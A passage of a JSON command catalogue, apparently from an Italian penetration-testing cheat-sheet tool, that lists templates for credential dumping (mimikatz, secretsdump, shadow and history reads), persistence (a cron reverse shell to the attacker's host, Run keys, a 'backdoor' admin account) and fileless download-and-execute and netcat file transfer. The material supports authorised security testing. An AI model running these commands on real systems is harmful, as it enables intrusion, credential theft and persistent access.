    "note": "# Attenzione\nMolto rumoroso e pieno di falsi positivi: adatto solo quando lo stealth non conta (lab, CTF, scope esplicito). Buono per header mancanti, file di default e versioni vecchie, ma ogni risultato va verificato a mano. Per un web scan più mirato preferisci nuclei.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "nikto",
      "scanner"
    ],
    "template": "nikto -h http://<ip> -o nikto.txt",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "sa-linux-who",
    "name": "Linux — chi sono / sistema",
    "category": "post-exp",
    "subcategory": "situational-awareness",
    "group": "Linux",
    "description": "Identità, host e fingerprint del sistema operativo: è il punto di partenza per capire su quale macchina si è finiti e verso quale utente si può salire.",
    "note": "# Prossimo passo\nKernel e distro vanno dati in pasto a `searchsploit` per gli exploit noti. La presenza di `/.dockerenv` o di cgroup anomali indica un container: lì si cerca una fuga, non un privesc classico.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "situational-awareness"
    ],
    "template": "id; whoami; hostname; uname -a; cat /etc/os-release",
    "params": []
  },
  {
    "id": "sa-linux-net",
    "name": "Linux — rete",
    "category": "post-exp",
    "subcategory": "situational-awareness",
    "group": "Linux",
    "description": "IP, route, ARP e socket in ascolto: trova servizi locali e altre reti raggiungibili (pivot).",
    "note": "# Cosa osservare\nI servizi in ascolto solo su `127.0.0.1` non sono raggiungibili da fuori: sono i candidati naturali al port forwarding. Le route verso altre subnet segnalano reti da raggiungere in pivoting.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "network"
    ],
    "template": "ip a; ip route; arp -a; ss -tlnp; cat /etc/hosts /etc/resolv.conf",
    "params": []
  },
  {
    "id": "sa-linux-users",
    "name": "Linux — utenti & processi",
    "category": "post-exp",
    "subcategory": "situational-awareness",
    "group": "Linux",
    "description": "Utenti con shell valida, login recenti e processi: cerca servizi che girano come root o come altri utenti.",
    "note": "# Prossimo passo\nGli utenti con shell valida sono bersagli di riuso password e lateral movement. I processi che girano come root o come altri utenti sono i primi candidati per il privilege escalation.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "users",
      "processes"
    ],
    "template": "grep -vE \"nologin|false\" /etc/passwd; w; last; ps auxf",
    "params": []
  },
  {
    "id": "sa-win-who",
    "name": "Windows — whoami /all",
    "category": "post-exp",
    "subcategory": "situational-awareness",
    "group": "Windows",
    "description": "Privilegi, gruppi e SID del token. I privilegi da controllare per primi sono quelli del tipo `SeImpersonatePrivilege`, insieme ai gruppi locali di appartenenza.",
    "note": "# Cosa osservare\nI privilegi `SeImpersonate` e `SeAssignPrimaryToken` abilitano i Potato; `SeBackup`/`SeRestore` danno accesso a SAM e NTDS; `SeDebug` alla memoria di LSASS. Appartenere a Backup Operators o Administrators è una scorciatoia diretta.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "situational-awareness"
    ],
    "template": "whoami /all & net localgroup Administrators & net localgroup \"Remote Desktop Users\" & net localgroup \"Remote Management Users\"",
    "params": []
  },
  {
    "id": "sa-win-sys",
    "name": "Windows — sistema & rete",
    "category": "post-exp",
    "subcategory": "situational-awareness",
    "group": "Windows",
    "description": "Info di sistema con `systeminfo` (input per il Windows Exploit Suggester), più IP, connessioni e share locali.",
    "note": "# Prossimo passo\nL’output di `systeminfo` è l’input di Windows Exploit Suggester (`wesng`): confronta le hotfix installate con la versione per trovare gli exploit kernel mancanti.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "systeminfo",
      "network"
    ],
    "template": "systeminfo & ipconfig /all & netstat -ano & net share",
    "params": []
  },
  {
    "id": "sa-win-domain",
    "name": "Windows — dominio (net)",
    "category": "post-exp",
    "subcategory": "situational-awareness",
    "group": "Windows",
    "description": "Enumera utenti e gruppi di dominio con i comandi `net` classici (se la macchina è joinata).",
    "note": "# Prerequisiti\nFunziona solo se la macchina è joinata al dominio. Da qui si passa all’enumerazione AD vera e propria (BloodHound, ldapsearch) usando il contesto dell’host compromesso.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "net",
      "domain"
    ],
    "template": "net user /domain & net group \"Domain Admins\" /domain & net group \"Enterprise Admins\" /domain & nltest /dclist:<domain>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      }
    ]
  },
  {
    "id": "creds-linux",
    "name": "Linux — caccia credenziali",
    "category": "post-exp",
    "subcategory": "cred-harvesting",
    "group": "Linux",
    "description": "Dove si nascondono le credenziali su Linux: `/etc/shadow`, chiavi SSH, history, config web, variabili d’ambiente.",
    "note": "# Quale variante usare\n- SSH keys: movimento laterale immediato verso altri host\n- Shadow: solo da root, poi crack offline con hashcat\n- History: password incollate in chiaro, spesso la via più rapida\n- Config web: credenziali DB in `wp-config.php` e `.env`\n- Env & token: segreti di API e servizi",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "credentials",
      "linux"
    ],
    "template": "find / \\( -name id_rsa -o -name id_ed25519 -o -name authorized_keys \\) 2>/dev/null",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "SSH keys",
        "template": "find / \\( -name id_rsa -o -name id_ed25519 -o -name authorized_keys \\) 2>/dev/null",
        "description": "Chiavi private e `authorized_keys`."
      },
      {
        "id": "shadow",
        "label": "Shadow",
        "template": "cat /etc/shadow",
        "description": "Hash delle password (serve root)."
      },
      {
        "id": "history",
        "label": "History",
        "template": "cat /home/*/.bash_history /root/.bash_history /home/*/.mysql_history 2>/dev/null",
        "description": "Comandi passati: spesso password in chiaro."
      },
      {
        "id": "configs",
        "label": "Config web",
        "template": "cat /var/www/html/wp-config.php /var/www/html/.env /var/www/html/config.php 2>/dev/null",
        "description": "`wp-config.php`, `.env`, `config.php` contengono credenziali DB."
      },
      {
        "id": "env",
        "label": "Env & token",
        "template": "env | grep -i \"key\\|token\\|secret\\|pass\"",
        "description": "Segreti nelle variabili d’ambiente."
      }
    ]
  },
  {
    "id": "mimikatz-logonpw",
    "name": "mimikatz — dump da LSASS",
    "category": "post-exp",
    "subcategory": "cred-harvesting",
    "group": "Windows",
    "description": "Estrae password, hash, ticket e segreti da memoria/registro. Serve SYSTEM o admin con `SeDebugPrivilege`. Molto rumoroso.",
    "note": "# Attenzione\nMimikatz sul target è rumorosissimo: AV ed EDR lo segnalano quasi sempre. Su host protetti conviene dumpare LSASS e analizzarlo offline con pypykatz. Richiede SYSTEM oppure un amministratore con `SeDebugPrivilege`.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "mimikatz",
      "lsass",
      "credentials"
    ],
    "template": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "logonpasswords",
        "template": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
        "description": "Password/hash in chiaro dalla memoria LSASS."
      },
      {
        "id": "sam",
        "label": "lsadump::sam",
        "template": ".\\mimikatz.exe \"privilege::debug\" \"lsadump::sam\" \"exit\"",
        "description": "Hash degli account locali (SAM)."
      },
      {
        "id": "lsa",
        "label": "lsadump::lsa",
        "template": ".\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /patch\" \"exit\"",
        "description": "LSA secrets (service account, cached)."
      },
      {
        "id": "dcsync",
        "label": "DCSync",
        "template": ".\\mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /user:Administrator\" \"exit\"",
        "description": "Estrae l’hash di un utente dal DC via replica (serve DA o diritti DCSync)."
      }
    ]
  },
  {
    "id": "secretsdump",
    "name": "impacket-secretsdump — dump remoto",
    "category": "post-exp",
    "subcategory": "cred-harvesting",
    "group": "Windows",
    "description": "Estrae le credenziali via RPC dai tre depositi di Windows: SAM per gli account locali, i segreti LSA e il database NTDS del dominio. Con `-just-dc-ntlm` preleva i soli hash NTLM del dominio, che è la conferma più rapida di aver ottenuto Domain Admin. Accetta password, hash o ticket.",
    "note": "# Quale variante usare\n- Password / NTLM hash: dump completo di SAM, LSA e, su un DC, del NTDS\n- Just DC NTLM: solo gli hash di dominio, la conferma più rapida di un Domain Admin\n- LOCAL: su hive salvati offline con `reg save HKLM\\SAM ...`\n\n# Dump di NTDS offline\nCon `SeBackupPrivilege` si copiano `NTDS.dit` e gli hive `SYSTEM`/`SECURITY`, poi `secretsdump -ntds NTDS.dit -system SYSTEM LOCAL` estrae tutti gli hash di dominio senza toccare il DC via rete.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "rpc",
      "dcsync"
    ],
    "tags": [
      "impacket",
      "secretsdump",
      "dcsync"
    ],
    "template": "impacket-secretsdump <domain>/<user>:<password>@<ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "hash",
        "label": "Hash NTLM",
        "placeholder": "aad3b435...",
        "ctx": "hash"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Password",
        "template": "impacket-secretsdump <domain>/<user>:<password>@<ip>",
        "description": "Auth con password."
      },
      {
        "id": "hash",
        "label": "NTLM hash",
        "template": "impacket-secretsdump <domain>/<user>@<ip> -hashes :<hash>",
        "description": "Pass-the-Hash (niente password)."
      },
      {
        "id": "ntdsonly",
        "label": "Just DC NTLM",
        "template": "impacket-secretsdump <domain>/<user>:<password>@<ip> -just-dc-ntlm",
        "description": "Solo hash NTLM dal NTDS del DC."
      },
      {
        "id": "local",
        "label": "LOCAL (SAM offline)",
        "template": "impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL",
        "description": "Su dump registro salvati con `reg save HKLM\\SAM...`."
      }
    ]
  },
  {
    "id": "lazagne",
    "name": "LaZagne — credenziali salvate",
    "category": "post-exp",
    "subcategory": "cred-harvesting",
    "group": "Windows",
    "description": "Recupera credenziali salvate ovunque: browser, Wi-Fi, mail, client DB.",
    "note": "# Cosa osservare\nRecupera credenziali da browser, Wi-Fi, client mail e client DB. Molti segreti sono legati all’utente: eseguilo nel contesto dell’utente bersaglio, non solo come SYSTEM.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "lazagne"
    ],
    "template": ".\\lazagne.exe all",
    "params": []
  },
  {
    "id": "pypykatz",
    "name": "pypykatz — parse dump LSASS",
    "category": "post-exp",
    "subcategory": "cred-harvesting",
    "group": "Windows",
    "description": "Mimikatz in Python: estrae credenziali da un dump LSASS offline (`procdump -ma lsass.exe lsass.dmp`), senza lanciare mimikatz sul target.",
    "note": "# Prerequisiti\nServe prima un dump di LSASS preso dal target (`procdump -ma lsass.exe`, Task Manager, o `comsvcs.dll MiniDump`). L’analisi avviene offline su Kali: nessun binario sospetto gira sul target.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "pypykatz",
      "lsass"
    ],
    "template": "pypykatz lsa minidump lsass.dmp",
    "params": []
  },
  {
    "id": "win-creds-misc",
    "name": "Windows — credenziali varie",
    "category": "post-exp",
    "subcategory": "cred-harvesting",
    "group": "Windows",
    "description": "Credenziali fuori da LSASS: Credential Manager, history PowerShell, autologon nel registro.",
    "note": "# Quale variante usare\n- Credential Manager: credenziali salvate, riusabili con `runas /savecred` anche senza conoscerle\n- PS history: comandi con password incollate\n- Autologon: password in chiaro nel registro",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "cmdkey",
      "autologon",
      "credentials"
    ],
    "template": "cmdkey /list",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "admin"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Credential Manager",
        "template": "cmdkey /list",
        "description": "Elenca le credenziali salvate. Per riutilizzarne una c'è la variante `runas /savecred`."
      },
      {
        "id": "runas",
        "label": "runas /savecred",
        "template": "runas /savecred /user:<user> cmd.exe",
        "description": "Riusa una credenziale salvata (vista con `cmdkey /list`): esegue un comando come quell'utente senza conoscerne la password."
      },
      {
        "id": "pshistory",
        "label": "PS history",
        "template": "type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
        "description": "Comandi PowerShell passati."
      },
      {
        "id": "autologon",
        "label": "Autologon",
        "template": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" | findstr /i \"DefaultUserName DefaultPassword AutoAdminLogon\"",
        "description": "Password di autologon in chiaro nel registro."
      }
    ]
  },
  {
    "id": "donpapi",
    "name": "DonPAPI — dump DPAPI remoto",
    "category": "post-exp",
    "subcategory": "cred-harvesting",
    "group": "Windows",
    "description": "Dump remoto e massivo dei segreti protetti da DPAPI (credenziali di browser, vault di Windows, Wi-Fi, certificati, cookie) da tutte le macchine su cui si hanno diritti di amministratore locale, il tutto da Linux. Dove secretsdump preleva SAM, LSA e NTDS, DonPAPI prende ciò che DPAPI protegge per singolo utente.",
    "note": "# Prerequisiti\nServono diritti di amministratore locale sui target. Estrae i segreti DPAPI per-utente che non compaiono in SAM/LSA/NTDS. Le versioni recenti (DonPAPI v2) usano la sintassi `donpapi collect`: verifica `donpapi collect -h` per i flag della tua versione.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "donpapi",
      "dpapi",
      "credentials"
    ],
    "template": "DonPAPI <domain>/<user>:<password>@<ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "pillage-files",
    "name": "Caccia file sensibili",
    "category": "post-exp",
    "subcategory": "pillaging",
    "group": "File locali",
    "description": "Cerca file interessanti sul filesystem: KeePass, backup, repo git, file unattended, web.config.",
    "note": "# Quale variante usare\n- Linux: KeePass (`.kdbx`), backup, repo git\n- Windows: file di risposta (`unattend.xml`, `sysprep.xml`) e `web.config`\n- Windows findstr: cerca la stringa password dentro i file di configurazione",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "pillaging",
      "find"
    ],
    "template": "find / \\( -name \"*.kdbx\" -o -name \"*.bak\" -o -name \".git\" \\) 2>/dev/null",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Linux",
        "template": "find / \\( -name \"*.kdbx\" -o -name \"*.bak\" -o -name \".git\" \\) 2>/dev/null",
        "description": "KeePass, backup, repo git."
      },
      {
        "id": "windows",
        "label": "Windows",
        "template": "dir /s /b C:\\*unattend*.xml C:\\*web.config* C:\\*.kdbx 2>nul",
        "description": "File di risposta, `web.config`, KeePass."
      },
      {
        "id": "findstr",
        "label": "Windows findstr",
        "template": "findstr /si \"password\" C:\\*.xml C:\\*.ini C:\\*.config 2>nul",
        "description": "Cerca la parola password nei file di config."
      }
    ]
  },
  {
    "id": "gpp-decrypt",
    "name": "GPP — cpassword in SYSVOL",
    "category": "post-exp",
    "subcategory": "pillaging",
    "group": "Share Hunt",
    "description": "Le Group Policy Preferences pre-2014 salvano password cifrate con chiave AES nota (MS14-025): cercale in SYSVOL e decifrale.",
    "note": "# Prossimo passo\nIl valore `cpassword` è cifrato con una chiave AES pubblica (MS14-025): si decifra all’istante. L’account recuperato è spesso un amministratore locale riusato su molti host: provalo subito in password spray.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "gpp",
      "sysvol",
      "ms14-025"
    ],
    "template": "findstr /si \"cpassword\" \\\\<dc>\\SYSVOL\\<domain>\\Policies\\*.xml",
    "params": [
      {
        "key": "dc",
        "label": "DC",
        "ctx": "ip",
        "placeholder": "dc01"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "cpassword",
        "label": "cpassword",
        "placeholder": "j1Uyj3Vx8TY9N1W..."
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Trova",
        "template": "findstr /si \"cpassword\" \\\\<dc>\\SYSVOL\\<domain>\\Policies\\*.xml",
        "description": "Cerca `cpassword` nei `Groups.xml`."
      },
      {
        "id": "decrypt",
        "label": "Decifra",
        "template": "gpp-decrypt <cpassword>",
        "description": "Decifra il valore `cpassword` trovato."
      }
    ]
  },
  {
    "id": "snaffler",
    "name": "Snaffler — file sensibili nelle share",
    "category": "post-exp",
    "subcategory": "pillaging",
    "group": "Share Hunt",
    "description": "Percorre tutte le share AD e segnala i file interessanti per nome/contenuto. Da una macchina Windows nel dominio.",
    "note": "# Cosa osservare\nVa eseguito da un host Windows nel dominio con un utente di dominio. Classifica i risultati per gravità (Black, Red, Yellow, Green): parti dai Black e Red, dove finiscono password e chiavi.",
    "platform": "windows",
    "requires": [
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "snaffler",
      "pillaging"
    ],
    "template": ".\\Snaffler.exe -s -o snaffler.log",
    "params": []
  },
  {
    "id": "manspider",
    "name": "manspider — keyword nelle share",
    "category": "post-exp",
    "subcategory": "pillaging",
    "group": "Share Hunt",
    "description": "Setaccia le share SMB del dominio alla ricerca di documenti che contengono parole chiave, oppure filtrando per estensione, il tutto da Linux. È lo strumento principale per il pillaging su rete: password in file di configurazione, chiavi private e backup finiscono di frequente in share accessibili a qualsiasi utente autenticato. Ogni risultato riporta share, percorso e contesto del match.",
    "note": "# Attenzione\nScarica e ispeziona il contenuto dei file: su share grandi è lento e genera molto traffico. Restringi per estensione o parola chiave e punta prima alle share leggibili da qualsiasi utente autenticato.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "manspider"
    ],
    "template": "manspider <range> -u '<user>' -p '<password>' -c 'password' 'secret' 'credential'",
    "params": [
      {
        "key": "range",
        "label": "Range",
        "placeholder": "10.10.10.0/24"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Keyword",
        "template": "manspider <range> -u '<user>' -p '<password>' -c 'password' 'secret' 'credential'",
        "description": "Cerca parole chiave nel contenuto dei documenti."
      },
      {
        "id": "ext",
        "label": "Per estensione",
        "template": "manspider <range> -u '<user>' -p '<password>' -e .kdbx .conf .config .xml .bak",
        "description": "Scarica i file con estensione interessante."
      }
    ]
  },
  {
    "id": "powerhuntshares",
    "name": "PowerHuntShares — mappa share e ACL",
    "category": "post-exp",
    "subcategory": "pillaging",
    "group": "Share Hunt",
    "description": "Scopre e analizza le share SMB del dominio da una macchina Windows, assegnando un punteggio di rischio ai permessi eccessivi (Everyone o Authenticated Users in scrittura) e generando un report HTML navigabile. Complementare a Snaffler: Snaffler cerca i file, PowerHuntShares mappa le share e i loro ACL.",
    "note": "# Cosa osservare\nEvidenzia le share con permessi di scrittura per gruppi larghi (Everyone, Authenticated Users): sono quelle dove depositare un payload o trovare file modificabili da chiunque. Il report HTML elenca share, ACL e file interessanti.",
    "platform": "windows",
    "requires": [
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "powerhuntshares",
      "shares",
      "pillaging"
    ],
    "template": "# importa il modulo PowerHuntShares\nImport-Module .\\PowerHuntShares.ps1\n\n# scopre le share del dominio e assegna un punteggio di rischio ai permessi\nInvoke-HuntSMBShares -Threads 100 -OutputDirectory C:\\Temp",
    "params": []
  },
  {
    "id": "persist-linux",
    "name": "Persistenza — Linux",
    "category": "post-exp",
    "subcategory": "persistence",
    "group": "Linux",
    "description": "Mantiene l'accesso tramite la propria chiave pubblica negli `authorized_keys` oppure un cron job con reverse shell. Da usare solo se lo scope lo prevede.",
    "note": "# Attenzione\nSolo se lo scope e le ROE lo prevedono, e va rimossa a fine test. La chiave SSH è più pulita del cron job; il cron a intervalli brevi è rumoroso e lascia traccia nei log.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "persistence",
      "linux"
    ],
    "template": "mkdir -p ~/.ssh; echo \"<pubkey>\" >> ~/.ssh/authorized_keys",
    "params": [
      {
        "key": "pubkey",
        "label": "Public key",
        "placeholder": "ssh-ed25519 AAAA..."
      },
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "4444"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "SSH key",
        "template": "mkdir -p ~/.ssh; echo \"<pubkey>\" >> ~/.ssh/authorized_keys",
        "description": "Chiave pubblica dell'attaccante, che abilita il login senza password."
      },
      {
        "id": "cron",
        "label": "Cron",
        "template": "(crontab -l 2>/dev/null; echo \"* * * * * bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\") | crontab -",
        "description": "Reverse shell ogni minuto via cron."
      }
    ]
  },
  {
    "id": "persist-windows",
    "name": "Persistenza — Windows",
    "category": "post-exp",
    "subcategory": "persistence",
    "group": "Windows",
    "description": "Mantiene l'accesso tramite chiave Run nel registro, scheduled task come SYSTEM o un nuovo utente amministratore locale. Da usare solo se lo scope lo prevede.",
    "note": "# Attenzione\nSolo se lo scope lo prevede. La chiave Run agisce al logon dell’utente; lo scheduled task come SYSTEM richiede admin; il nuovo utente amministratore è la tecnica più rumorosa e più facilmente rilevata.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "persistence",
      "windows"
    ],
    "template": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Temp\\shell.exe\"",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Registry Run",
        "template": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Temp\\shell.exe\"",
        "description": "Esegue il payload a ogni logon dell’utente."
      },
      {
        "id": "task",
        "label": "Scheduled task",
        "template": "schtasks /create /sc onlogon /tn Updater /tr \"C:\\Temp\\shell.exe\" /ru SYSTEM",
        "description": "Task a ogni logon, come SYSTEM (serve admin)."
      },
      {
        "id": "user",
        "label": "Nuovo admin",
        "template": "net user backdoor P@ssw0rd123! /add & net localgroup Administrators backdoor /add",
        "description": "Nuovo utente locale aggiunto agli Administrators."
      }
    ]
  },
  {
    "id": "transfer-http",
    "name": "Trasferimento via HTTP",
    "category": "post-exp",
    "subcategory": "file-transfer",
    "group": "HTTP",
    "description": "Ospita i file su un server HTTP lato attaccante, da cui vengono poi scaricati sul target con il tool disponibile.",
    "note": "# Quale variante usare\n- Server: avvialo nella cartella coi tool\n- Linux: `wget` o `curl`\n- Windows: `iwr` oppure `certutil`\n- Fileless: `IEX` esegue in memoria, senza scrivere su disco (evita l’AV su file)",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "file-transfer",
      "http"
    ],
    "template": "python3 -m http.server 80",
    "params": [
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "file",
        "label": "File",
        "placeholder": "linpeas.sh"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Server (attacker)",
        "template": "python3 -m http.server 80",
        "description": "Server HTTP nella cartella corrente."
      },
      {
        "id": "linux",
        "label": "Download Linux",
        "template": "wget http://<lhost>/<file> -O /tmp/<file>",
        "description": "Oppure `curl http://<lhost>/<file> -o /tmp/<file>`."
      },
      {
        "id": "windows",
        "label": "Download Windows",
        "template": "iwr -uri http://<lhost>/<file> -outfile <file>",
        "description": "PowerShell `Invoke-WebRequest`; alternativa `certutil -urlcache -f http://<lhost>/<file> <file>`."
      },
      {
        "id": "memory",
        "label": "Fileless (PS)",
        "template": "IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/<file>')",
        "description": "Esegue lo script in memoria, senza scriverlo su disco."
      }
    ]
  },
  {
    "id": "transfer-smb",
    "name": "Trasferimento via SMB",
    "category": "post-exp",
    "subcategory": "file-transfer",
    "group": "SMB",
    "description": "Due direzioni: server SMB dall’attacker (il target Windows scarica), oppure upload diretto su una share con credenziali via `nxc --put-file` o `smbclient put`. `-smb2support` per i Windows recenti.",
    "note": "# Attenzione\nUtile quando l’egress HTTP è filtrato. I Windows recenti rifiutano l’autenticazione guest verso il server SMB dell’attaccante: in quel caso usa l’upload autenticato (`nxc --put-file` o `smbclient put`) su una share scrivibile. `-smb2support` è obbligatorio coi Windows moderni.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "file-transfer",
      "smb",
      "impacket"
    ],
    "template": "impacket-smbserver share ./ -smb2support",
    "params": [
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "share",
        "label": "Share",
        "placeholder": "C$"
      },
      {
        "key": "lfile",
        "label": "File locale",
        "placeholder": "shell.exe"
      },
      {
        "key": "rfile",
        "label": "Path remoto",
        "placeholder": "\\\\Windows\\\\Temp\\\\shell.exe"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Server (attacker)",
        "template": "impacket-smbserver share ./ -smb2support",
        "description": "Condivide la cartella corrente come `share`."
      },
      {
        "id": "copy",
        "label": "Copia (Windows)",
        "template": "copy \\\\<lhost>\\share\\file.exe C:\\Temp\\",
        "description": "Dal target Windows: copia dalla share dell'attaccante."
      },
      {
        "id": "nxc-upload",
        "label": "Upload (nxc)",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' --put-file <lfile> <rfile> --share <share>",
        "description": "Carica `<lfile>` sulla share remota (`--share`, default `C$`). Per scaricare: `--get-file <rfile> <lfile>`. Serve una credenziale e permesso di scrittura sulla share."
      },
      {
        "id": "smbclient-upload",
        "label": "Upload (smbclient)",
        "template": "smbclient //<ip>/<share> -U '<user>%<password>' -c 'put <lfile> <rfile>'",
        "description": "Upload one-shot con `-c` senza entrare nella shell. Dentro la sessione interattiva: `put <lfile>` per caricare, `get` per scaricare."
      }
    ]
  },
  {
    "id": "transfer-misc",
    "name": "Trasferimento — nc / base64",
    "category": "post-exp",
    "subcategory": "file-transfer",
    "group": "Senza tool",
    "description": "Quando mancano HTTP/SMB: trasferisci con netcat o, per file piccoli, copia-incolla in base64.",
    "note": "# Quale variante usare\n- netcat: quando c’è `nc` ma non HTTP/SMB\n- base64: file piccoli, si incolla in qualsiasi shell; su Windows `certutil -decode`\n\n# Attenzione\nVerifica sempre l’hash dopo il trasferimento (`md5sum`, `Get-FileHash`): i trasferimenti grezzi si corrompono facilmente.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "file-transfer",
      "nc",
      "base64"
    ],
    "template": "# sul ricevente: resta in ascolto e scrive quello che arriva su file\nnc -lvnp 9999 > file\n\n# sul mittente: invia il file al ricevente\nnc <ip> 9999 < file",
    "params": [
      {
        "key": "ip",
        "label": "Destinatario",
        "ctx": "ip",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "b64",
        "label": "Stringa base64",
        "placeholder": "H4sIAAA..."
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "netcat",
        "template": "# sul ricevente: resta in ascolto e scrive quello che arriva su file\nnc -lvnp 9999 > file\n\n# sul mittente: invia il file al ricevente\nnc <ip> 9999 < file",
        "description": "Receiver in ascolto, sender invia il file."
      },
      {
        "id": "base64",
        "label": "base64",
        "template": "# sulla sorgente: codifica il file in una riga sola da copiare\nbase64 -w0 file\n\n# sulla destinazione: decodifica la riga e ricostruisce il file\necho \"<b64>\" | base64 -d > file",
        "description": "Per file piccoli; su Windows `certutil -decode encoded.txt file`."
      }
    ]
  },
  {
    "id": "linpeas",
    "name": "LinPEAS — enum privesc",
    "category": "privesc-linux",
    "subcategory": "auto-enum",
    "group": "Linux",
    "description": "Lo scan privesc più completo su Linux: evidenzia in rosso/giallo i vettori interessanti (SUID, cron, capabilities, password).",
    "note": "# Cosa osservare\nI risultati in rosso/giallo sono i vettori più probabili (SUID insoliti, sudo, cron scrivibili, credenziali). LinPEAS segnala, non sfrutta: conferma sempre a mano prima di procedere.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "linpeas",
      "peass",
      "enum"
    ],
    "template": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Fileless",
